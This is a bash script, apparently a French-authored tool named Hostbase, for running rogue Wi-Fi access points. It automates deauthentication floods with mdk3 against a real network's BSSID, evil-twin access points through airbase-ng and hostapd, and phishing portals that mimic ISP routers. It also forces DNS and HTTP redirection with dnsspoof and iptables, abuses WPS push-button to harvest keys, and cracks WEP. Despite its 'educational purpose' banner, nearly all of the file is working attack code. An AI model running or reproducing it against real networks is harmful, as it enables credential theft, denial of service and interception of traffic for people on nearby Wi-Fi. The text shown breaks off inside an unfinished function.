#!/bin/bash
# Under licence GPLv3 http://www.gnu.org/licenses/gpl.txt
# Hostbase By Koala alias Flow
### Hostbase By Koala ###
### Script destiné a des tests sur les réseaux wifi ###
### Enjoy ###
### En cas de modification du script pour la conf de hostapd ou des options de airbase, ne pas oublier de laisser un espace derrière l'essid (sinon bash ne traduira pas l'espace meme si vous le rentrez)exemple: "{essid} " et un espace derrière {essid} pour hostapd.

f_Banniere(){
echo -e "\e[1;33m Hostbase version 1.0 (released November 2016) By Koala alias Flow\e[0m"
echo -e "                        |\          )           (                              "
echo -e "                    ____| \__        )         (                               "
echo -e "                   |       @ \        )       (                                "
echo -e "~~~~~~~~~~~~~~~~~~~|~~<->    /         )     (                                 "
echo -e "                   |_________\          ) | (                                  "
echo -e "                    |    |                |                                    "
echo -e "___________________(|)__(|)_____________  |  __________________________________"
echo -e "\e[1;34m Rogue AP script, welcome to the last generation of rogue AP.\e[0m"
echo -e "\e[1;34m This script is only for educational purpose.\e[0m"
echo
echo -e "\e[1;31m For a better visibility, put the window in full screen.\e[0m"
echo
}
##################################################

f_checkexit(){

        echo -e "\n\e[1;34m[*]\e[0m Disabling monitor mode, clean temp files, backup of apache... WAIT !\n"

       sleep 2;
        echo -e "\n\e[1;34m[*]\e[0m Restarting your wireless card as default mode...\n"
        sudo sysctl net.ipv4.ip_forward=0
        sleep 2;
        airmon-ng stop ${moniteurmode} &> /dev/null
        sleep 4;
        airmon-ng stop ${intmoniteur} &> /dev/null
        sleep 4;
        rfkill unblock all
        ifconfig ${monmode} up       

        if [ -f "/tmp/hostapd.pid" ];then
        killall hostapd
        killall wpa_supplicant
        kill 9 `cat /tmp/wpacliactu.pid`
        killall dnsspoof
        cd /tmp/
        rm -rf *.pid
        rm -rf *.txt
        rm -rf /root/hostapd.psk
        rm -rf /root/hostapd.conf
        cd /var/www/
        rm -rf *
        sleep 1;
        echo -e "\n\e[1;34m[*]\e[0m Clean up terminated see you later...\n"
        sleep 2;
        for PID in $( ps -e | grep xterm | awk '{print $1;}' ); do kill ${PID} 2>&-; done
        else
        echo -e "\n\e[1;34m[*]\e[0m Clean up terminated see you later...\n"
        sleep 2;
        for PID in $( ps -e | grep xterm | awk '{print $1;}' ); do kill ${PID} 2>&-; done
fi
	exit 2> /dev/null
}

##################################################

f_wlan(){
echo -e "\e[1;34m[*]\e[0m Disabling not necessary process... WAIT"
        sleep 2;
airmon-ng check kill
        sleep 8;
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*'  ; then
	airmon-ng start ${monmode}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_wlan
fi

ifconfig -a
unset moniteurmode
while [ -z "${moniteurmode}" ]; do read -p "Name of the card in monitor mode, (ex: wlan0mon, mon0 etc...): " moniteurmode; done
}

##################################################

f_wlanhostapd(){
echo -e "\e[1;34m[*]\e[0m Hostapd"
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlan1 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*'  ; then 
        ifconfig ${monmode} up
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_wlanhostapd
fi
}

##################################################

f_wlanhostapdmulti(){
         echo -e "\e[1;34m[*]\e[0m Hostapd multi AP"
ifconfig -a
unset monmode
while [ -z "${monmode}" ]; do read -p "Wireless card for attack (ex. wlan0 wlp...): " monmode; done
if echo ${monmode} | egrep '^wlan*|wlp*'  ; then 
        ifconfig ${monmode} up
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 3;
f_wlanhostapdmulti
fi

unset newmonmode
while [ -z "${newmonmode}" ]; do read -p "Second virtual wireless card renamed by hostapd (SEE THE README)  (ex. wlan1 wlp**1): " newmonmode; done
if echo ${newmonmode} | egrep '^wlan*|wlp*'  ; then 
        echo -e "\e[1;34m[*]\e[0m OK"
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 3;
f_wlanhostapdmulti
fi

unset thirdmonmode
while [ -z "${thirdmonmode}" ]; do read -p "Third virtual wireless card renamed by hostapd (SEE THE README) (ex. wlan2 wlp**2): " thirdmonmode; done
if echo ${thirdmonmode} | egrep '^wlan*|wlp*'  ; then 
        echo -e "\e[1;34m[*]\e[0m OK"
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 3;
f_wlanhostapdmulti
fi

unset int2
while [ -z "${int2}" ]; do read -p "Current name of your real second wireless devices: " int2; done
if echo ${int2} | egrep '^wlan*|wlp*'  ; then 
        echo -e "\e[1;34m[*]\e[0m OK"
        ifconfig ${int2} down  
        ip link set ${int2} name wlan5
        ifconfig wlan5 up
        sleep 4;
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 3;
f_wlanhostapdmulti
fi
}


###################################################

f_interfaceairbase(){
ifconfig -a
unset int2
while [ -z "${int2}" ]; do read -p "Name of your second wireless card: " int2; done
       if echo ${int2} | egrep '^wlan*|wlp*'  ; then
echo -e "\e[1;34m[*]\e[0m Starting monitor mode."
airmon-ng start ${int2}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_interfaceairbase
fi

ifconfig
unset intmoniteur
while [ -z "${intmoniteur}" ]; do read -p "Name of the second wireless card in monitor mode: " intmoniteur; done


unset ESSID
while [ -z "${ESSID}" ]; do read -p "ESSID of real network: " ESSID; done
        echo -e "\e[1;34m[*]\e[0m OK"


unset canal
while [ -z "${canal}" ]; do read -p "Channel of real network: " canal; done
if (($canal >= 1 && $canal <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 5;
f_interfaceairbase
fi


read -ep "                BSSID of real network : " BSSID           
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           
echo -e " $rojo Erreur : BSSID no valid $colorbase"
echo "  "
read -ep "                BSSID of real network : " BSSID 
echo "  "            
done
f_airbaseflood
}

##################################################

f_airbaseflood(){
echo -e "\e[1;34m[*]\e[0m Starting ddos..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -g -t "${BSSID}" -c "${canal}" &> /dev/null &
sleep 20;
xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -c "${canal}" -a "${BSSID}" --essid "${ESSID}" -W 1 ${intmoniteur} &> /dev/null &
sleep 4;
f_mainmenu
}

##################################################

f_floodinterface(){
ifconfig -a
unset intmon
while [ -z "${intmon}" ]; do read -p "Name of your second wireless card (enter wlan5 if you use hostapd multi AP): " intmon; done
       if echo ${intmon} | egrep '^wlan*|wlp*'  ; then
echo -e "\e[1;34m[*]\e[0m Starting monitor mode."
airmon-ng start ${intmon}
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_floodinterface
fi

ifconfig
unset intmoniteur
while [ -z "${intmoniteur}" ]; do read -p "Name of the second wireless card in monitor mode,: " intmoniteur; done
}

##################################################

f_floodinstantane(){
           echo -e "\e[1;34m[*]\e[0m Starting ddos... waiting for the target victim..... Be cool and take a drink..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -g -t "${BSSID}" -c "${canal}" &> /dev/null &
sleep 20;
xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -c "${canal}" -a "${BSSID}" --essid "${ESSID}" -W 1 ${intmoniteur} &> /dev/null &
sleep 4;
until test -s /root/hostapd.psk; do 
sleep 1;
done
echo -e "\e[1;34m[*]\e[0m Victim connected, stopping ddos."
sleep 2;
          for PID in $( ps -e | pgrep mdk3 | awk '{print $1;}' ); do kill ${PID} 2>&-; done
sleep 2;
          for PID in $( ps -e | pgrep airbase | awk '{print $1;}' ); do kill ${PID} 2>&-; done
sleep 2;
          kill 9 `cat /tmp/hostapdclirefresh.pid`
sleep 2;
f_wps
}


##################################################

f_wps(){
echo -e "\e[1;34m[*]\e[0m Starting the second interface and init wps_pbc mode..."
airmon-ng stop ${intmoniteur}
sleep 5;
rfkill unblock all
ifconfig ${intmon} up
sleep 4;
       echo -e "\e[1;34m[*]\e[0m Configuration and start of wpa_cli..."
killall wpa_supplicant
echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" | sudo tee /etc/wpa_supplicant.conf
sudo wpa_supplicant -B -Dnl80211 -i${intmon} -c/etc/wpa_supplicant.conf
sleep 2;
while : ; do
        xterm -e wpa_cli wps_pbc ${BSSID} ; sleep 120 ; done &
       echo $! >/tmp/wpacliactu.pid
f_mainmenu
}

##################################################

f_config(){
clear
f_Banniere
echo "1.  Edit hostapd.conf for personal conf"
echo "2.  Edit dhcpd.conf for personal conf"
echo "3.  Previous menu"
echo
read -p "Choice: " prereqschoice

case ${prereqschoice} in
1) f_nanohostapd ;;
2) f_dhcp ;;
3) f_mainmenu ;;
*) f_config ;;
esac
}
##################################################

f_nanohostapd(){
nano /root/hostapd.conf
f_config
}

f_dhcp(){
nano /etc/dhcp/dhcpd.conf
f_config
}

##################################################

f_rogueap(){
clear
f_Banniere
echo "1.  Rogue AP with airbase"
echo "2.  Rogue AP with hostapd and the wps push button"
echo "3.  Rogue AP with hostapd multi access points using wps push button"
echo "4.  Airbase fake AP wep encrypted"
echo "5.  Start aircrack to decrypt the key"
echo "6.  Ddos attack"
echo "7.  Use your own hostapd conf file (go to file config)"
echo "8.  Connected Rogue AP with hostapd and the wps push button to redirect trafic outside on https or http website"
echo "9.  Menu précédent"
echo
read -p "Choix: " fapchoix

case ${fapchoix} in
1) f_opnairbaserogue ;;
2) f_hostapdwps ;;
3) f_hostapdmultiap ;;
4) f_airbasewep ;;
5) f_aircrack ;;
6) f_ddos ;;
7) f_confperso ;;
8) f_hostapdwpsrogueconnected ;;
9) f_mainmenu ;;
*) f_rogueap ;;
esac
}
##################################################

f_opnairbaserogue(){
f_wlan
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
unset essid
while [ -z "${essid}" ]; do read -p "Essid name, LET A SPACE after the last letter: " essid; done



unset channel
while [ -z "${channel}" ]; do read -p "Channel (must be different of real AP): " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 5;
f_opnairbaserogue
fi



unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Wich network you want to phish? (ex. livebox sfr bbox ou free): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'free' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 2;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK, Starting airbase as open network"
xterm -hold -bg '#000000' -fg '#3A94FF' -e airbase-ng -P -C 30 -c "${channel}" -e "${essid} " "${moniteurmode}" &> /dev/null &
sleep 5;
f_dhcpconf
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: enter a correct network to phish !\n"
        sleep 4;
f_opnairbaserogue
fi
}


##################################################

f_dhcpconf(){
echo -e "\e[1;34m[*]\e[0m Configuring at0..."
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface at0;
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;
	ifconfig at0 up
        sudo sysctl net.ipv4.ip_forward=1
        ifconfig at0 10.0.0.1 netmask 255.255.255.0
        ifconfig at0 mtu 1400
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
        sleep 2;
        route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.0.0.1
        iptables -P FORWARD ACCEPT
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
        echo > '/var/lib/dhcp/dhcpd.leases' 
        echo -e "\e[1;34m[*]\e[0m Starting dhcp server..."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null & 
        sleep 3;
        echo -e "\e[1;34m[*]\e[0m Starting apache and dnsspoof..."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i at0 -f /root/dns.txt &> /dev/null &
        sudo chown -R root:www-data /var/www/*
        sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo service apache2 restart
        sleep 4; 
	f_mainmenu
}


################################################## 

f_dhcpconfhtpd(){
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface ${monmode};
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;    
         
             echo > '/var/lib/dhcp/dhcpd.leases'
         echo -e "\e[1;34m[*]\e[0m Starting dhcp server..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;   
         sudo sysctl net.ipv4.ip_forward=1
         sudo ifconfig ${monmode} 10.0.0.1 netmask 255.255.255.0
         sleep 1;
         iptables --flush
         iptables --table nat --flush
         iptables --delete-chain
         iptables --table nat --delete-chain
         sleep 2;
         route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 10.0.0.1
        iptables -P FORWARD ACCEPT
         iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80
         sleep 2;
        echo -e "\e[1;34m[*]\e[0m Starting apache and dnsspoof..."
        xterm -hold -bg '#000000' -fg '#3A94FF' -e dnsspoof -i ${monmode} -f /root/dns.txt &> /dev/null &
        sudo chown -R root:www-data /var/www/*
        sleep 1
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo service apache2 restart   
        sleep 4; 
	f_mainmenu
}


##################################################   

f_dhcpconfhtpdmulti(){
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface ${monmode};
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
subnet 192.168.0.0 netmask 255.255.255.0 {
interface ${newmonmode};
range 192.168.0.2 192.168.0.10;
option routers 192.168.1.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 192.168.1.1;
allow unknown-clients;
}
subnet 172.0.0.0 netmask 255.255.255.0 {
interface ${thirdmonmode};
range 172.0.0.2 172.0.0.10;
option routers 172.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 172.0.0.1;
allow unknown-clients;
}
EOF
sleep 1;
         ifconfig ${monmode} up
         sudo sysctl net.ipv4.ip_forward=1
         sudo ifconfig ${monmode} 10.0.0.1 netmask 255.255.255.0
         sleep 1;
         route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
         ifconfig ${newmonmode} up
         sudo ifconfig ${newmonmode} 192.168.1.1 netmask 255.255.255.0
         sleep 1;
         route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.1.1
         sudo ifconfig ${thirdmonmode} up
         sudo ifconfig ${thirdmonmode} 172.0.0.1 netmask 255.255.255.0
         sleep 1;
         route add -net 172.0.0.0 netmask 255.255.255.0 gw 172.0.0.1
         sleep 1;
         iptables --flush
         iptables --table nat --flush
         iptables --delete-chain
         iptables --table nat --delete-chain
         sleep 2;
         iptables -A FORWARD -i ${monmode} -o ${thirdmonmode} -m state --state ESTABLISHED,RELATED \
 -j ACCEPT
  iptables -A FORWARD -i ${newmonmode} -o ${thirdmonmode} -m state --state ESTABLISHED,RELATED \
 -j ACCEPT
  iptables -A FORWARD -i ${thirdmonmode} -o ${newmonmode} -m state --state ESTABLISHED,RELATED \
 -j ACCEPT
  iptables -t nat -A POSTROUTING -o ${monmode} -j SNAT --to 10.0.0.1
         sleep 2;
         echo > '/var/lib/dhcp/dhcpd.leases'
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
         sleep 3;
        echo -e "\e[1;34m[*]\e[0m Starting apache and dnsspoof..."
        xterm -e dnsspoof -i ${monmode} -f /root/dns.txt &
        sleep 1;
        xterm -e dnsspoof -i ${newmonmode} -f /root/dns.txt &
        sleep 1;
        xterm -e dnsspoof -i ${thirdmonmode} -f /root/dns.txt &
        sleep 1;
        sudo chown -R root:www-data /var/www/*
        sleep 1;
        find /var/www -type f -exec sudo chmod 777 {} \;
        sudo service apache2 restart   
        sleep 4; 
	f_mainmenu
}

##################################################    

f_dhcprogueconnected(){
cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface ${monmode};
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 8.8.8.8;
allow unknown-clients;
}
EOF
sleep 1;   
             echo > '/var/lib/dhcp/dhcpd.leases'
         echo -e "\e[1;34m[*]\e[0m Starting dhcp server..."
         xterm -hold -bg '#000000' -fg '#3A94FF' -e dhcpd -d /etc/dhcpd.conf &> /dev/null &
        sleep 3;  
         sudo sysctl net.ipv4.ip_forward=1
         sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
         sleep 1;
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain
         sleep 2;
         sudo iptables -t nat -A POSTROUTING -o ${ethmode} -j MASQUERADE
         sudo iptables -A FORWARD -i ${ethmode} -o ${monmode} -m state --state RELATED,ESTABLISHED -j ACCEPT
         sudo iptables -A FORWARD -i ${monmode}  -o ${ethmode} -j ACCEPT
sleep 2;
f_mainmenu
}

###################################################
 
f_hostapdwps(){
f_wlanhostapd
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
touch /root/hostapd.psk
touch /root/hostapd.conf
unset essid
while [ -z "${essid}" ]; do read -p "Essid name, LET A SPACE after the last letter: " essid; done


unset channel
while [ -z "${channel}" ]; do read -p "Channel (must be different of real AP): " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 3;
f_hostapdwps
fi

unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Wich network you want to phish? (ex. livebox sfr bbox ou free) (ex. livebox sfr bbox ou free): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'free' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 3;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: enter a correct network to phish !\n"
        sleep 4;
f_hostapdwps
fi


cat <<-EOF > /root/hostapd.conf
interface=${monmode}
driver=nl80211
ssid=${essid} 
ieee8021x=1
wpa=2
hw_mode=g
ieee80211n=1
channel=${channel}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=12345678
wpa_psk_file=/root/hostapd.psk
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF
       sleep 2;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd, wait..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
       echo $! >/tmp/hostapdclirefresh.pid
	f_dhcpconfhtpd
}
##################################################

f_hostapdmultiap(){
f_wlanhostapdmulti
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
touch /root/hostapd.psk
touch /root/hostapd.conf
unset essid
while [ -z "${essid}" ]; do read -p "Essid's name, LET A SPACE after the last letter, hostapd will create 3 networks: " essid; done


unset channel
while [ -z "${channel}" ]; do read -p "Channel (must be different of real AP): " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 5;
f_hostapdmultiap
fi

unset fakepagechoix
while [ -z "${fakepagechoix}" ]; do read -p "Wich network you want to phish? (ex. livebox sfr bbox ou free): " fakepagechoix; done
if [ "${fakepagechoix}" = 'livebox' ] || [ "${fakepagechoix}" = 'sfr' ] || [ "${fakepagechoix}" = 'bbox' ] || [ "${fakepagechoix}" = 'free' ]; then
mkdir /root/apachebackup
cp -R /var/www/* /root/apachebackup/
sleep 2;
cd /var/www/
rm -rf *
cp -R /etc/${fakepagechoix}/* /var/www/
sleep 2;
        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: enter a correct network to phish !\n"
        sleep 4;
f_hostapdmultiap
fi


cat <<-EOF > /root/hostapd.conf
interface=${monmode}
driver=nl80211
ssid=${essid} 
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=12345678                         
wpa_psk_file=/root/hostapd.psk
hw_mode=g
ieee80211n=1
wmm_enabled=1
channel=${channel}
country_code=FR
ieee8021x=1
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
# 2e AP
bss=${newmonmode}
ssid=${essid}-Assistance
auth_algs=1           
wpa=2    
wpa_key_mgmt=WPA-PSK 
rsn_pairwise=TKIP CCMP
wpa_passphrase=onsenfou
wpa_psk_file=/root/hostapd.psk
hw_mode=g
ieee80211n=1
wmm_enabled=1
channel=${channel}
country_code=FR
ieee8021x=1
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
# 3e AP
bss=${thirdmonmode}
ssid=${essid} 
channel=${channel}
EOF

      echo -e "\e[1;34m[*]\e[0m Starting hostapd as multi AP mode, wait......"
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 10;
 echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
        echo $! >/tmp/hostapdclirefresh.pid
	f_dhcpconfhtpdmulti
}
##################################################

f_hostapdwpsrogueconnected(){
f_wlanhostapd
rm -rf /etc/dhcp/dhcpd.conf
touch /etc/dhcp/dhcpd.conf
touch /root/hostapd.psk
touch /root/hostapd.conf
unset essid
while [ -z "${essid}" ]; do read -p "Essid name, LET A SPACE after the last letter: " essid; done


unset channel
while [ -z "${channel}" ]; do read -p "Channel (must be different of real AP): " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 3;
f_hostapdwpsrogueconnected
fi

ifconfig -a
unset ethmode
while [ -z "${ethmode}" ]; do read -p "Interface connected to the network (ex. eth0 enp*** en***...): " ethmode; done
if echo ${ethmode} | egrep '^eth*|en*'  ; then
        echo -e "\e[1;34m[*]\e[0m OK"
        else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid name !\n"
	sleep 4;
f_hostapdwpsrogueconnected
fi

cat <<-EOF > /root/hostapd.conf
interface=${monmode}
driver=nl80211
ssid=${essid} 
ieee8021x=1
wpa=2
hw_mode=g
ieee80211n=1
channel=${channel}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=12345678
wpa_psk_file=/root/hostapd.psk
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF
       sleep 2;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd, wait..."
xterm -hold -bg '#000000' -fg '#3A94FF' -e hostapd /root/hostapd.conf &> /dev/null &
echo $! >/tmp/hostapd.pid
sleep 5;
       echo -e "\e[1;34m[*]\e[0m Starting hostapd_cli in background..."
while : ; do
        xterm -e hostapd_cli wps_pbc ; sleep 120 ; done &
       echo $! >/tmp/hostapdclirefresh.pid
	f_dhcprogueconnected
}

############################################

f_airbasewep(){
f_wlan
ifconfig -a
read -ep "                Mac of your wireless card : " mamac           
echo "  "
while !(echo $mamac | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           
echo -e " $rojo Erreur : MAC no valid $colorbase"
echo "  "
read -ep "                Mac of your wireless card : " mamac 
echo "  "            
done

unset name
while [ -z "${name}" ]; do read -p "Name of cap file: " name; done
        echo -e "\e[1;34m[*]\e[0m OK"

unset essid
while [ -z "${essid}" ]; do read -p "Essid name, LET A SPACE after the last letter: " essid; done
        echo -e "\e[1;34m[*]\e[0m OK"

unset channel
while [ -z "${channel}" ]; do read -p "Channel (must be different of real AP): " channel; done
if (($channel >= 1 && $channel <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 5;
f_airbasewep
fi
        echo -e "\e[1;34m[*]\e[0m Starting airbase-ng as a WEP network."
airbase-ng -c "${channel}" --essid "${essid} " -L -W 1 "${moniteurmode}" &
sleep 5;
        echo -e "\e[1;34m[*]\e[0m Starting airodump-ng for grab some IVS."
xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng -c "${channel}" -d "${mamac}" -w "${name}" "${moniteurmode}" &> /dev/null &
sleep 3;
f_mainmenu
}
##################################################

f_aircrack(){
xterm -hold -bg '#000000' -fg '#3A94FF' -e aircrack-ng *.cap &> /dev/null &
f_mainmenu
}
##################################################

f_ddos(){
clear
f_Banniere
echo "1.  Ddos mode if you are using hostapd rogue AP"
echo "2.  Ddos mode if you are using airbase-ng rogue AP"
echo "3.  Previous menu"
echo
read -p "Choix: " ddoschoix

case ${ddoschoix} in
1) f_interface ;;
2) f_interfaceairbase ;;
3) f_rogueap ;;
*) f_ddos ;;
esac
}
##################################################

f_interface(){
f_floodinterface
unset ESSID
while [ -z "${ESSID}" ]; do read -p "ESSID of real network: " ESSID; done
        echo -e "\e[1;34m[*]\e[0m OK"


unset canal
while [ -z "${canal}" ]; do read -p "Channel of real network: " canal; done
if (($canal >= 1 && $canal <= 13)); then

        echo -e "\e[1;34m[*]\e[0m OK"
        sleep 2;
else
	echo -e "\n\e[1;31m[-]\e[0m ERROR: invalid channel !\n"
	sleep 5;
f_interface
fi


read -ep "                BSSID of real network : " BSSID           
echo "  "
while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
do                                                                           
echo -e " $rojo Erreur : BSSID no valid $colorbase"
echo "  "
read -ep "                BSSID of real network : " BSSID 
echo "  "            
done
f_floodinstantane
}

##################################################

f_confperso(){
f_wlanhostapd
touch /root/hostapd.psk
